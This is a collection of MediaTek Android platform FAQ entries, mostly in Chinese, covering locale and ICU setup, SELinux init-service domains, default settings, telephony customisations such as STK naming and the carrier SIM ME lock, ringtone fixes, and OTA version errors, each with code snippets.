如果添加的语言代码是正确的，列表种还是没有，请检查framework的res下是否有相应的values-xx-rYY文件夹，例如

JB2、JB3在ProjectConfig.mk文件MTK_PRODUCT_LOCALES处加上bn_IN,ur_PK后，setting语言列表却找不到这2个语言，那是因为

frameworks/base/core/res/res/下缺少文件values-bn-rIN和values-ur-rPK,需要新建并在其里面新建文件arrays.xml(KK和L上是strings.xml)，内容如下：

<?xml version="1.0" encoding="utf-8"?>
<resources>
    <integer-array name="maps_starting_lat_lng">
        <item>20593684</item>
        <item>78962880</item>
    </integer-array>
    <integer-array name="maps_starting_zoom">
        <item>3</item>
    </integer-array>
</resources>

三、语言列表中出现空白或者乱码
这是由于缺少字库或者字库添加不正确造成的，可以参考FAQ04513
如果按照上面步骤检查后仍有问题，请联系MTK技术人员解决。
```

## [icu]  [FAQ04553]  ICU资源简单介绍

```text
1、什么是icu4c
ICU4C是ICU在C/C++平台下的版本, ICU(International Component for Unicode)是基于用于支持软件国际化的开源项目。ICU4C提供了C/C++平台强大的国际化开发能力，软件开发者几乎可以使用ICU4C解决任何国际化的问题，根据各地的风俗和语言习惯，实现对数字、货币、时间、日期、和消息的格式化、解析，对字符串进行大小写转换、整理、搜索和排序等功能，必须一提的是，ICU4C提供了强大的BIDI算法，对阿拉伯语等BIDI语言提供了完善的支持。

在平台新增一种语言必须要添加对应的icu资源(如zh_CN.txt,my.txt)，并重新编译ICU。ICU资源可在http://site.icu-project.org/  网址上下载。

（1）打开网址选择左侧列表框的DownloadICU
（2）选择“offcial Release”中最新版本的ICU4C如50.1
（3）下载“ICU4C Source Code Download”框中第一个包如“icu4c-50 l-data.zip”

2、新增语言添加哪些icu资源
下载完icu4c code包解压为data文件夹下面对应会有coll、curr、lang、locales、region，zone几个子文件夹。各种语言的icu资源就在这些文件夹里面。如中文以及中文简体的资源为zh.txt,zh_CN.txt(中文代码为zh，大陆国家码为CN)。新增语言时只需把所需语言的icu资源分布添加到平台对应的文件夹下，并修改对应mk文件重新编译就行。

具体如何添加可参考FAQ： FAQ04009 
```

## [默认值]  [FAQ04326]  如何打开一种语言以及如何设置开机默认语言

```text
如何打开语言支持计划中的语言?
如何打开一种新语言?
如何设置开机默认语言?

[Solution] 
一、如何打开语言支持计划中的语言?
Android KK JB
关于MTK语言支持情况请参考：FAQ03761
请打开文件：mediatek/config/${Project}/ProjectConfig.mk
找到宏MTK_PRODUCT_LOCALES，把所需的语言代码添加进去，比如添加越南语"vi_VN"
如果没有找到MTK_PRODUCT_LOCALES，可能在mediatek/config/common/ProjectConfig.mk中.
ANDROID L 
MTK_PRODUCT_LOCALES这个宏已经没有使用，使用的是alps\device\公司名字\项目名字\项目名字.mk  中的PRODUCT_LOCALES请添加语言的时候在PRODUCT_LOCALES中添加。
例如我司自己内部的项目代号aubest52 那么添加语言路径是（device\mediatek\aubest52\full_aubest52.mk中的PRODUCT_LOCALES后面添加语言）其他流程和KK一致

二、怎么添加一种新语言
请参FAQ04009

2.1、如果打开后在语言列表中没有找到该语言 
请参FAQ08860

三、设置开机默认语言 
如果想把某种语言设置为开机默认语言，只需把这个语言的代码放到(Android L PRODUCT_LOCALES后面第一个即可),（Android KK MTK_PRODUCT_LOCALES的第一个即可)。
```

## [FAQ18376]  [MMS] 彩信发送Vcard，接收失败，内容为空

```text
彩信发送Vcard，接收失败，内容为空。
有一种情况是网络在转发时修改了数据，如下左图是手机发送时的数据，右图是从网络接收时的数据，接收的数据多了一个par。
如果是这种情况，请参考下面的workaround 改法。

修改SlideshowModel.java 的createFromPduBody()方法如下：

// Create media models for each slide.
NodeList mediaNodes = par.getChildNodes();
int mediaNum = mediaNodes.getLength();
ArrayList<MediaModel> mediaSet = new ArrayList<MediaModel>(mediaNum);
// mtk add start 
boolean isIgnore = false;
for (int k = 0; k < mediaNum; k++) {
    SMILMediaElement sme1 = null;
    try {
        sme1 = (SMILMediaElement) mediaNodes.item(k);
    } catch (ClassCastException cce1) {
        MmsLog.e(TAG, cce1.getMessage());
        continue;
    }
    String tag = sme1.getTagName();
    String src = sme1.getSrc();
    if (tag.equals(SmilHelper.ELEMENT_TAG_REF)) {
        String suffix = src.contains(".") ? src.substring(src.lastIndexOf("."), src.length()) : "";        
        if (suffix.equals(".vcf") || suffix.equals(".vcs")  ) {
            isIgnore = true;
        }
    }
}
if (isIgnore) {
    continue;
}
// mtk add end

for (int j = 0; j < mediaNum; j++) {
    /// M: Code analyze 012, new feature, catch ClassCastException @{
    SMILMediaElement sme = null;
    try {
        sme = (SMILMediaElement) mediaNodes.item(j);
    } catch (ClassCastException cce) {
        MmsLog.e(TAG, cce.getMessage());
        continue;
    }
    
FAQ中是用什么工具分析的??
```

## [init]  [FAQ14743]  init 启动 Native Service 时出现Service xxxx needs a SELinux domain defined; please fix 警告的说明

```text
init 启动 Native Service 时出现Service xxxx needs a SELinux domain defined; please fix 警告的说明
 
[Keyword] 
SELinux, Native Service, init, domain

[Android Version] 
Version >= android 5.0
 
[Solution] 
在android 5.0 后, 默认启用了Enforcing SELinux. 有很多同仁经常会从kernel log 中看到这样的警告.
"[1:init] init: Warning! Service xxxx needs a SELinux domain defined; please fix!"

其原因是因为Google 要求init 启动service 时，都要进行SELinux domain 切换，即从init domain 切换到另外的domain. 这个是从安全方面考虑的, 默认init domain 的SELinux 权限很大, 可以做很多危险行为，比如mount image, kill process 等等. 如果普通service 使用 init domain, 就增大了可攻击的安全面.

Google 在CTS 中有对这一项进行检查， CTS fail of android.security.cts.SELinuxDomainTest # testInitDomain

通常情况下，如果init 启动的是一个可快速执行完的oneshot 的service, 即非deamon 程序, “一闪而过” 的话，可以不进行domain 切换. 此类CTS 检测不到.  如果init 启动的是常驻内存的deamon service, 那么一定要进行domain 切换.(L0/L1 版版本)

但在M版本上,Google 增强了这块的约束，通过使用neverallow init { file_type fs_type}:file execure_no_trans;严格限制了init 启动service 都必须进行domain 切换，否则service 无法启动!!!

下面是一个demo, 方便大家参考.
定义一个init 启动的service, demo_service, 对应的执行档是/system/bin/demo.
(1).  创建一个demo.te 在/device/mediatke/common/sepolicy 目录下, 然后在/device/mediatke/common/BoardConfig.mk 的BOARD_SEPOLICY_UNION 宏中新增 demo.te (注意: M 版本后取消了BOARD_SEPOLICY_UNION 宏，不需要再修改了，添加了文件即可)
(2).  定义demo 类型，init 启动service 时类型转换, demo.te 中
type  demo, domain;
type   demo_exec, exec_type, file_type;
init_daemon_domain(demo)
(3).  绑定执行档 file_context 类型
/system/bin/demo  u:object_r:demo_exec:s0
(4). 根据demo 需要访问的文件以及设备,  定义其它的权限在demo.te 中.

针对特别执行shell 的service , 需要特别处理, 因为/system/bin/sh 已经被定义成了shell_exec 的label. 而有很多这样的service 依赖于sh, 于是需要使用seclabel 操作.
(1). 在你的service 定义中写入 seclabel u:r:demo:s0
(2). 创建你的xxxx_service.te 文件, 和前面类似
type demo, domain;
domain_trans(init, shell_exec, demo)
(3). 根据demo 需要访问的文件以及设备,  定义其它的权限在demo.te 中.

如果大家需要更加深入理解SELinux ，可以参考:

MTK Online SELinux Topic,  没有比这更加完整的文档了.
http://online.mediatek.com/_layouts/15/mol/topic/ext/Topic.aspx?id=158
```

## [FAQ18043]  手机端删除文件之后在PC端查看MTP内容更新但可用容量未更新

```text
操作步骤：
被测终端连接MTP至PC端，进入文件管理，删除话机U盘或者SD中的一个文件，进入PC端MTP设备查看
实际结果：
话机U盘或者SD卡的可用容量不变
预期结果：
删除文件后可用容量应该变大
备注：重新插拔数据线后连接MTP后可用容量正常
 
[Analyze] 
 
PC端如果要更新MTP信息会通过/dev/mtp_usb节点向native层发送请求
当在手机端操作删除一个文件之后，PC端仅仅会发送更新存储器里面内容的请求，不会发送更新storage info的请求

01-02 02:54:36.733539 1123 1890 V MediaProvider: [MediaProvider]  --- delete<<<: uri=content://media/external/file, count=1
01-02 02:54:36.742277 1123 3715 D MtpServer: operation: MTP_OPERATION_GET_OBJECT_HANDLES
01-02 02:54:36.742424 1123 3715 D MtpServer: doGetObjectHandles: storageID = 0x767a0001, format = 0x0, parent = 0xffffffff
01-02 02:54:36.747435 789 2539 D AudioTrack: AudioTrackThread::pauseInternal: ns = 12673505
01-02 02:54:36.747470 789 814 D SettingsInterface: from settings cache , name = dropbox:system_app_strictmode , value = null
01-02 02:54:36.747923 1123 3715 D MtpServer: sending response 2001
01-02 02:54:36.748851 1123 3715 D MtpServer: operation: MTP_OPERATION_GET_OBJECT_PROP_LIST
01-02 02:54:36.749223 1123 3715 D MtpServer: GetObjectPropList 66 format: NONE property: MTP_PROPERTY_OBJECT_FORMAT group: 0 depth: 0
01-02 02:54:36.749356 1123 3715 D MtpDatabase: getObjectPropertyList: handle = 0x42, property = 0xdc02
```

## [默认值]  [FAQ18383]  默认设置以飞行模式开机

```text
若有需求在烧完版本后，需要以飞行模式开机，那么请按照如下修改方案进行修改
将/frameworks/base/packages/SettingsProvider/res/values/defaults.xml中
<bool name="def_airplane_mode_on">false</bool>
修改为
<bool name="def_airplane_mode_on">true</bool>

注：仅第一次开机有效，若在使用过程中有离开飞行模式，那么下次开机会保持离开飞行模式状态
```

## [FAQ11162]  [SAT] 移除google默认浏览器后,LAUNCH BROWSER发生异常

```text
客户若将google默认的浏览器移除，则当SAT测试中执行与LAUNCH BROWSR命令相关的测项时都会报exception。

分析:
由于StkAppService.java中是写死调用google默认的浏览器来执行打开browser的动作。
如果把google默认的浏览器移除，那么就无法找到对应的Activity，引起exception。

那么这种case下，需要客户自行修改代码，修改为替换的browser app和activity 即可。
alps\mediatek\packages\apps\stk1\src\com\android\stk\StkAppService.java
private void launchBrowser(BrowserSettings settings) {
    if (settings == null) {
        return;
    }
    ...............
    intent.setClassName("com.android.browser", "com.android.browser.BrowserActivity");
将红色的字符修改为替换的browser app name和activity name。
而L0.MP5版本以及以后的版本包括 L1和M版本上这行 code已经去掉，并没有写死要启动的 activity。所以，L0.MP5以及以后的版本不用再做这个处理。
```

## [FAQ05657]  [SAT] 如何动态修改SIM卡应用名称

```text
方法一：
以将STK app name动态修改成运营商名称为例子。
1、运营商的名称存储在以下SystemProperty中
卡1:  TelephonyProperties.PROPERTY_OPERATOR_ALPHA 
卡2:  TelephonyProperties.PROPERTY_OPERATOR_ALPHA_2

2、使用运营商名字来动态修改package对应的app name(应用程序名字) 
2.1  如果是GB3版本，则
修改文件：ContextImpl.java
具体修改如下：
import android.os.SystemProperties;
import com.android.internal.telephony.TelephonyProperties;
@Override
public CharSequence getText(String packageName, int resid, ApplicationInfo appInfo) {
    ResourceName name = new ResourceName(packageName, resid);
    CharSequence text = getCachedString(name);
    if (text != null) {
         //add start
         if(packageName.equalsIgnoreCase("com.android.stk"))
         {
            Log.d("jby","packagemanager1,stkpackageName1:"+packageName);
             String tmptext=SystemProperties.get(TelephonyProperties.PROPERTY_OPERATOR_ALPHA);
            if(!tmptext.isEmpty())
              if(!tmptext.equalsIgnoreCase("com.android.stk"))
                       text=tmptext;
         }
         else if(packageName.equalsIgnoreCase("com.android.stk2"))
         {
            Log.d("jby","packagemanager1,stkpackageName2:"+packageName);
            String tmptext=SystemProperties.get(TelephonyProperties.PROPERTY_OPERATOR_ALPHA_2);
            if(!tmptext.isEmpty())
              if(!tmptext.equalsIgnoreCase("com.android.stk2"))
                            text=tmptext;
         }
         Log.d("jby","text="+text);
        //add end
        return text;
    }
    if (appInfo == null) {
        try {
            appInfo = getApplicationInfo(packageName, 0);
        } catch (NameNotFoundException e) {
            return null;
        }
    }
    try {
        Resources r = getResourcesForApplication(appInfo);
        text = r.getText(resid);
        putCachedString(name, text);
        //add start
         if(packageName.equalsIgnoreCase("com.android.stk"))
         {
            Log.d("jby","packagemanager1,stkpackageName1:"+packageName);
         String tmptext=SystemProperties.get(TelephonyProperties.PROPERTY_OPERATOR_ALPHA);
            if(!tmptext.isEmpty())
              if(!tmptext.equalsIgnoreCase("com.android.stk"))
                            text=tmptext;
         } else if(packageName.equalsIgnoreCase("com.android.stk2")) {
            Log.d("jby","packagemanager2,stkpackageName2:"+packageName);
            String tmptext=SystemProperties.get(TelephonyProperties.PROPERTY_OPERATOR_ALPHA_2);
            if(!tmptext.isEmpty())
              if(!tmptext.equalsIgnoreCase("com.android.stk2"))
                            text=tmptext;
         }
         Log.d("jby","text="+text);
          //add end
        return text;
    } catch (NameNotFoundException e) {
        Log.w("PackageManager", "Failure retrieving resources for" + appInfo.packageName);
    } catch (RuntimeException e) {
        // If an exception was thrown, fall through to return
        // default icon.
        Log.w("PackageManager", "Failure retrieving text 0x" + Integer.toHexString(resid) + " in package " + packageName, e);
    }
    return null;
}

2.2  如果是JB2以及JB2以后的版本，则
修改文件：ApplicationPackageManager.java
具体修改：参考上述的GB3版本修改，基本一样。

方法二：
1、如果是GB3、GB5版本，则
修改文件:
packages\apps\launcher2\src\com\android\launcher2\PagedViewIcon.java
具体修改：将applyFromApplicationInfo()方法中的setText，通过packageName来过滤，设置期望显示的名字。
例如：packageName = “com.android.stk1”, 期望显示的名字"我的名字"，则
if (packageName 等于info.componentName.mPackage) {
   setText("我的名字")
} else {
   setText(info.title);
}

2、如果是JB2以及JB2以后的版本，则
修改的文件： PagedViewIcon.java
两个SAT应用程序是共用一个packageName的，所以无法通过应用的包名来区分，必须通过类名来区分。
例如：插入卡槽2的SIM或USIM应用程序是通过启动"stkLauncherActivityⅡ"。
 将applyFromApplicationInfo()方法中的setText，通过TargetclassName来过滤，设置期望显示的名字。
   例如：TargetclassName = “stkLauncherActivityII”, 期望显示的名字"我的名字"，则
   if (TargetclassName 等于info.componentName.mClass) {
       setText("我的名字")
   } else {
       setText(info.title);
   }

L0 、L1 、M版本：
由于StkAppService启动的packageName和activity都只有一个，所以无法区分，因此，无法用这种方法做客制化。

例如：针对联通定制版，要实现STK应用名称从卡里读取并显示(JB2以及JB2以后的版本)。
由于SAT 应用是动态安装的。launcher 菜单中的 SAT应用图标是 Stk1.apk的图标。

1、从systemproperty中获取卡的运营商名称。
可以参考方法2中的2.1 的demo code，修改 ApplicationPackageManager.java 文件的 getText() 方法，从SystemProperties中获取对应的卡的运营商名称:
String tmptext=SystemProperties.get(TelephonyProperties.PROPERTY_OPERATOR_ALPHA);
String tmptext=SystemProperties.get(TelephonyProperties.PROPERTY_OPERATOR_ALPHA_2);

2、两个SAT应用程序是共用一个packageName的，所以无法通过包名来区分，必须通过类名来区分。

例如插入卡槽2的sim或usim应用程序是通过启动"stkLauncherActivityII"
将applyFromApplicationInfo()方法中的setText，通过TargetclassName来过滤，设置期望显示的名字 为从步骤 1 获取到的名字。
例如：TargetclassName = "stkLauncherActivityII", 期望显示的名字"我的名字"
if (TargetclassName 等于info.componentName.mClass) {
    setText("我的名字");
} else {
    setText(info.title);
}
```

## [默认值]  [FAQ15507]  【VoLTE】如何让手机的增强型4GLTE开关默认处于关闭状态?

```text
MTK默认的版本中，Setting里面的增强4GLTE开关（VoLTE）默认是开启的，如果想要将其默认设置为关闭状态的话请参考如下修改即可：

package com.android.providers.settings;
DatabaseHelper.java
loadSetting(stmt, Settings.Global.ENHANCED_4G_MODE_ENABLED, ImsConfig.FeatureValueConstants.ON);（两处地方），将ImsConfig.FeatureValueConstants.ON 改为 OFF

alps/device/mediatek/common/device.mk 文件中如下位置
ifeq ($(strip $(MTK_VOLTE_SUPPORT)), yes)
    PRODUCT_PROPERTY_OVERRIDES += ro.mtk_volte_support=1
    PRODUCT_PROPERTY_OVERRIDES += persist.mtk.volte.enable=1
endif
将persist.mtk.volte.enable=1
修改为 ：persist.mtk.volte.enable=0
```

## [FAQ18353]  [Legacy Wi-Fi] 如何用adb shell am命令关闭wifi后台扫描

```text
adb shell am broadcast -a com.mtk.stopscan.activated // 关闭scan
adb shell am broadcast -a com.mtk.stopscan.deactivated // 开启scan
PS：注意不要进入到WifiSettings的页面，因为apk来的Scan，不会挡
```

## [FAQ15313]  How to close the scan function started by framework

```text
we can enter linux environment, and use adb cmd to stop scan function.

adb shell am broadcast -a com.mtk.stopscan.activated // stop scan
adb shell am broadcast -a com.mtk.stopscan.deactivated // start scan
ps: the method is onlu used to stop scan function started by framework.
```

## [FAQ12261]  [Dialer] 如何客制化俄文拨号盘?

```text
4.2 JB 拨号盘显示是通过多张图片拼接起来显示的，4.4 KK的拨号盘是通过多个TextView显示字符串来实现的，
所以客制化KK的拨号盘只需要客制化对应字符串即可。
方法一:
FILE: alps\packages\apps\Dialer\res\values-ru\strings.xml 
在res\values-ru\strings.xml下面没有定义如下字符串，自己客制化为俄文即可：

<string name="dialpad_star_number">*</string>
<string name="dialpad_pound_number">#</string>
<string name="dialpad_0_letters">+</string>
<string name="dialpad_1_letters"></string>
<string name="dialpad_2_letters">ABC</string>
<string name="dialpad_3_letters">DEF</string>
<string name="dialpad_4_letters">GHI</string>
<string name="dialpad_5_letters">JKL</string>
<string name="dialpad_6_letters">MNO</string>
<string name="dialpad_7_letters">PQRS</string>
<string name="dialpad_8_letters">TUV</string>
<string name="dialpad_9_letters">WXYZ</string>
<string name="dialpad_star_letters"></string>
<string name="dialpad_pound_letters"></string>

优点：修改量小，容易实现；
缺点：如果同时显示英文和俄文字符，则不能单独设置颜色。

方法二:
参考之前英文字符的显示方法自己添加一个TextView来显示俄文字符，然后在res\values-ru\strings.xml中添加对应的字符串即可。
优点：同时显示英文和俄文字符时，可以单独设置俄文的字体颜色/字体大小/位置等。
缺点：修改量大。
```

## [FAQ18330]  开机向导中设置用户名称后，在设置多用户中当前用户名称没有修改

```text
Google的开机向导设置用户名称，在设置多用户中，当前用户名称没有修改，始终是Owner
修改如下：
packages/apps/Settings/src/com/android/settings/users/ProfileUpdateReceiver.java

import android.os.SystemProperties;

public void onReceive(final Context context, Intent intent) {
    Log.d("ProfileUpdateReceiver", "Profile photo changed, get the PROFILE_CHANGED receiver.");
    // Profile changed, lets get the photo and write to user manager
    new Thread() {
        public void run() {
            Utils.copyMeProfilePhoto(context, null);
            ///M: Fix ALPS01262605
            String isGMS = SystemProperties.get("ro.com.google.gmsversion", null);
            if (isGMS != null) {
                copyProfileName(context);
            }
        }
    }.start();
}
```

## [FAQ18333]  设置->数据流量->WI-FI里面，选择跨年日期时，图片坐标最终日期不显示年

```text
进入设置->数据流量->WI-FI里面，选择跨年日期( 终止日期的年跨过起始年份)时，图片坐标最终日期不显示年
例如选择日期Dec 7，2014 - Jan 4,2015里面；最终图片只显示Jan 4，不显示2015

这个android对时间显示的默认设计，如果跟现在时间是同一年，就不再额外显示年份，敝司觉得是合理的，如果贵司觉得这是个问题要修改，可以参考如下修改方式：
packages/apps/Settings/src/com/settings/DataUsageSummary.java
如下方法里，添加format time的flag FORMAT_SHOW_YEAR

public static String formatDateRange(Context context, long start, long end) {
    final int flags = FORMAT_SHOW_YEAR | FORMAT_SHOW_DATE | FORMAT_ABBREV_MONTH;
    synchronized (sBuilder) {
        sBuilder.setLength(0);
        return DateUtils.formatDateRange(context, sFormatter, start, end, flags, null).toString();
    }
}
```

## [锁网]  [FAQ12121]  [SEC] 如何调用接口来解锁SIM ME Lock

```text
该FAQ介绍如何调用Telephony Framework的接口来解锁SIMME Lock。

在实现运营商的锁网需求时，如果不是MTK原生Keyguard，或者是用户单独开发的解锁界面，调用Telephony的接口函数时，建议参考MTK原生Keyguard的实现方式用一个新线程来实现。

 [SOLUTION] 

Framework提供的解锁函数为 PhoneInterfaceManagerEx.java supplyNetworkDepersonalization()，可以调用此函数来解锁。

1. L版本上参考KeyguardSimPinPukMeView.java中的 CheckSimMe thread.run()函数调用方式，

实例如下：

      private class simMeCheckThread extends Thread {

        private final String mPasswd;
        private int mSlotId;
        private int mResult;
 
        protected simMeCheckThread (String passwd, long slotId) {

            mPasswd = passwd;
            mSlotId= slotId;
        }

        @Override
        public void run() {

            try {
 //注意L上slotId与subId的差别，需要进行转换
 long []  subIds = SubcriptionManager.getSubId(slotId);
                Log.d(TAG, "CheckMe, " + "slotId = " + slotId + ", subId = " + subIds[0] );
 //supplyNetworkDepersonalization()
                mResult = ITelephonyEx.Stub.asInterface(ServiceManager.getService("phoneEx"))
                        .supplyNetworkDepersonalization(subIds[0] , mPasswd);

                Log.d(TAG, "CheckMe, " + "mSlotId=" + mSlotId + " mResult=" + mResult);
            } catch (RemoteException e) {
                Log.e(TAG, "supplyNetworkDepersonalization got exception: " + e.getMessage());
            }
        }
    }
 2. KK版本可以参考KeyguardSimPinPukView.java CheckSimMe thread 中的run()函数调用方式。

实例如下:

import com.mediatek.common.telephony.ITelephonyEx;
 
private class SimMeCheckThread extends Thread {
    int mSimId;
    String mPasswd;

    SimMeCheckThread(int mSimId, string mPasswd) {
        this.mSimId = mSimId;
        this.mPasswd = mPasswd;
    }

    @Override
    public void run() {
        try {
           Log.d(TAG, "simMeCheckThread-run() mSimId =" + mSimId +" mPasswd ="+mPasswd);
           //supplyNetworkDepersonalization()
           mResult = ITelephonyEx.Stub.asInterface(ServiceManager.checkService("phoneEx")).supplyNetworkDepersonalization(mPasswd, mSimId);
           Log.d(TAG, "simMeCheckThread-run()done mResult =" + mResult);                      
        } catch (Exception e) {
            Log.e(TAG, "supplyNetworkDepersonalization got exception: " + e.getMessage());

        }
    }
}
```

## [锁网]  [FAQ12108]  [SEC] 输入暗码来上锁和解锁SIM ME LOCK功能

```text
运营商需求如下:
输入*#3411#来解锁SIM ME LOCK功能，重启后，非法的卡不需要输入解锁密码。
输入*#3412#来上锁SIM ME LOCK功能，重启后，非法的卡需要输入解锁密码。

[SOLUTION] 
实现思路：
由于modem配置锁卡数据之后，是无法修改的。所以UNLOCK和LOCK的功能在AP端来模拟.
1）在modem端配置SML 参数，配置锁卡信息：默认是上锁状态，参考DMS上文档：SIM-ME lock，根据锁需要的 lock 配置相应的 NVRAM_EF_SML_DEFAULT。
2）在app端模拟解锁和上锁的功能。

修改步骤:

增加一个system property 记录是否有输入解锁暗码。默认值为false，就是上锁状态；如果默认值为true则为解锁状态。
针对插入非法卡时，开机时有被locked的处理。
L版本请修改：

alps/frameworks/base/packages/Keyguard/src/com/android/keyguard/KeyguardUpdateMonitor.java
private void proceedToHandleSimStateChanged(SimArgs simArgs) {
    if ((IccCardConstants.State.NETWORK_LOCKED == simArgs.simState) && KeyguardUtils.isMediatekSimMeLockSupport()) {
        //从system Property中取值判断
        //如果不需要输入解锁密码，则直接调用解锁函数进行解锁.
        //参考FAQ12121 [SEC] 如何调用接口来解锁SIM ME Lock
        new simMeCheckThread(simArgs.subId, mPasswd).start();
        //mPasswd为modem配置的解锁密码.
    } else {

L之前的版本请修改：alps\frameworks\base\policy\src\com\android\internal\policy\impl\keyguard\KeyguardUpdateMonitor.java

private final BroadcastReceiver mBroadcastReceiver = new BroadcastReceiver() {
} else if (TelephonyIntents.ACTION_SIM_STATE_CHANGED.equals(action)) {
if (IccCardConstants.State.NETWORK_LOCKED == simArgs.simState) {
    //从system Property中取值判断
    //如果不需要输入解锁密码，则直接调用解锁函数进行解锁.
    //参考FAQ12121 [SEC] 如何调用接口来解锁SIM ME Lock
    new SimMeCheckThread(simArgs.simId, mPasswd).start();
    //mPasswd为modem配置的解锁密码.
否则就按照原有流程跑，就会正常显示输入锁卡密码界面，需要解锁。 

输入暗码的处理
输入*#3411#，解锁设置system Property 为true
输入*#3412#，上锁设置system property 为false
```

## [log]  [FAQ18375]  分析windowManagerService相关的问题，需要提交哪些log给MTK?

```text
测试的过程中，我们有时候会遇到如下的一些问题，比如:
画面切换或者动画过程中闪屏
window顺序排列异常
转屏过程中出现画面异常
window size异常
........
这些问题，往往无法从默认的mtklog中分析出原因，需要window log才能做具体分析
 
[SOLUTION] 
抓取window log的方式有两种:
1.adb shell命令动态打开,不需要build codebase
adb shell dumpsys window -d enable a
PS:不需要用adb shell stop/start重启adb,重启手机或者重启adb后都需要重新开启

2.修改WindowManagerService.java中相关的code
将windowManagerService.java中的所有带DEBUG标志的flag(比如DEBUG,DEBUG_XX)都修改为true,然后重新build frameworks/base/services/core 模块

window log包含在mtklog中，复现问题后直接提交mtklog给MTK即可
```

## [FAQ18349]  设置歌曲为来电铃声，删除歌曲后，来电铃声异常

```text
1, packages/services/Telecomm/src/com/android/server/telecom/AsyncRingtonePlayer.java
private Ringtone getRingtone(Uri ringtoneUri) {
/* if (ringtoneUri == null) {
ringtoneUri = Settings.System.DEFAULT_RINGTONE_URI;//ringtone,which can be changed by customer
} */ 
//add begin
Log.d(this, "lll getRingtone ringtoneUri" + ringtoneUri);
if(ringtoneUri == null){
Uri defaultringtoneUri = RingtoneManager.getDefaultRingtoneUri(mContext, AudioProfileManager.TYPE_RINGTONE);//default ringtone 
AudioProfileManager audioProfileMgr = (AudioProfileManager) mContext.getSystemService(Context.AUDIO_PROFILE_SERVICE);
ringtoneUri = audioProfileMgr.getRingtoneUri(audioProfileMgr.getActiveProfileKey(), AudioProfileManager.TYPE_RINGTONE);
Log.d(this, "lll getRingtone ringtoneUri " + ringtoneUri+ " defaultringtoneUri " + defaultringtoneUri);
if (-1 == RingtoneManager.validRingtoneUri(mContext, ringtoneUri,RingtoneManager.TYPE_RINGTONE)) {
ringtoneUri = defaultringtoneUri;
}
Log.d(this, "lll getRingtone actual ringtoneUri" + ringtoneUri); 
}
Ringtone ringtone = RingtoneManager.getRingtone(mContext, ringtoneUri);
//add end

//ALPS01820873 ringtone maybe null
if (ringtone != null) {
ringtone.setStreamType(AudioManager.STREAM_RING);
}
return ringtone;
}
2,frameworks/base/media/java/android/media/RingtoneManager.java
public static int validRingtoneUri(Context context, Uri ringtoneUri, int type) //将public替换为private
```

## [FAQ18372]  静音或震动模式下开机仍然会有开机铃声，如何修改为没有开机铃声?

```text
静音或震动模式下开机仍然会有开机铃声，是bootanimation_main.cpp文件中读取persist.sys.mute.state的值读取不到所致。
如何修改为静音或震动模式下没有开机铃声?

[SOLUTION] 
1，原因是读取persist.sys.mute.state的属性值时，data分区未挂载，导致读取属性值失败。
2，修改方法如下： 
frameworks/base/cmds/bootanimation/BootAnimation.cpp
117static const int ANIM_ENTRY_NAME_MAX = 256;
118static const bool deal_with_encryption = true;//add
char* BootAnimation::initAudioPath() {
821 if (!bPlayMP3) {
822 XLOGD("initAudioPath: DON'T PLAY AUDIO!");
823 return NULL;
824 }
825
//----------------add--------------------
826 char crypto_state[PROPERTY_VALUE_MAX] ;
827 char type[PROPERTY_VALUE_MAX] ;
828 char status[PROPERTY_VALUE_MAX] ;
829 char volume[PROPERTY_VALUE_MAX] ;
830
831 property_get("ro.crypto.state", crypto_state, "-1");
832 property_get("vold.encryption.type", type, "-1");
833 XLOGD("[BootAnimation %s %d] ro.crypto.state=%s, vold.encryption.type=%s",
834 __FUNCTION__,__LINE__, crypto_state, type);
835 while (strcmp(type, "-1") == 0 &&
836 strcmp(crypto_state, "unencrypted") != 0 &&
837 deal_with_encryption == true){
838 usleep(100000);
839 property_get("ro.crypto.state", crypto_state, "-1");
840 property_get("vold.encryption.type", type, "-1");
841 }
842
843 while (strcmp(type, "default") == 0 && deal_with_encryption == true){
844 property_get("vold.decrypt", status, "-1");
845 if (strcmp(status, "trigger_restart_framework") != 0){
846 usleep(100000);
847 XLOGD("[BootAnimation %s %d] Decrypt status=%s",__FUNCTION__,__LINE__,status);
848 continue;
849 }
850 property_get("persist.sys.mute.state", volume, "-1");
851 int nVolume = -1;
852 nVolume = atoi(volume);
853 XLOGD("[BootAnimation %s %d] nVolume=%d",__FUNCTION__,__LINE__,nVolume);
854 if(nVolume == 0 || nVolume == 1){
855 XLOGD("initAudioPath: DON'T PLAY AUDIO!");
856 return NULL;
857 }
858 break;
859 }
860
//----------------add--------------------
861 int index = 0;
862 if (bBootOrShutDown) {
863 index = 0;
864 } else {
865 index = 1;
866 }
```

## [FAQ18334]  短信的通知音很长，此时再来电话后，会重叠播放；如何实现来电时，短信通知声应该停止播放?

```text
1，将短信的通知铃声设置为播放时间比较长的Mp3或其它文件
2, 来短信，将播放所设定的短信通知铃声，此时来电，来电铃声与短信通知铃声重叠播放在一起
3，如何实现来电时，短信通知声应该停止播放?
 
frameworks/base/services/core/java/com/android/server/notification/NotificationManagerService.java 
private void listenForCallState() { 
TelephonyManager.from(getContext()).listen(new PhoneStateListener() {
@Override
public void onCallStateChanged(int state, String incomingNumber) {

// Add begin
Log.d(TAG,"listenForCallState() state = " + state);
long identity = Binder.clearCallingIdentity();
if (state == AudioSystem.PHONE_STATE_RINGING){
    try {
        final IRingtonePlayer player = mAudioManager.getRingtonePlayer();
        if (player != null) {
            Log.e(TAG, "listenForCallState() player.stopAsync()");
            player.stopAsync();
        }
    } catch (RemoteException e) {
    } finally {
        Binder.restoreCallingIdentity(identity);
    }
}
// add end
if (mCallState == state) return;
if (DBG) Slog.d(TAG, "Call state changed: " + callStateToString(state));
mCallState = state;
}
}, PhoneStateListener.LISTEN_CALL_STATE);
}
```

## [OTA]  [FAQ09066]  OTA 升级查询版本失败，log显示your version is illegal！ 解决办法

```text
在使用MTK OTA升级的时候，出现查询版本失败的现象，查看log里面提示your version is illegal！报的error为1105
 
这是因为手机的信息，也就是old版本的信息与Server上提交old版本时候填写的信息不一致。 old版本，new版本在upload到server的时候，server上要求填写的项是来自于package包的build.prop文件。对应关系如下：
       build.prop                        upload.php
–      ro.build.display.id-----------------build number of the version
–      ro.product.locale.language---------------LANGUAGE
–      ro.product.manufacturer------------------OEM
–      ro.operator.oper--------------------OPERATOR
–      ro.product.device-----------PRODUCT
–      ro.build.fingerprint------------FINGERPRINT
–      ro.build.version.release--------------------android version
–      ro.product.name------------------------name of the version

请注意：

1、如果 build.prop 中ro.build.display.id的值包含keys或者不以ALPS开头，
upload.php的build number of the version需要填写build.prop中ro.mediatek.version.release的值，而不是ro.build.display.id的值
手机相关code在：SystemUpdate/src/com/mediatek/systemupdate/Util.java

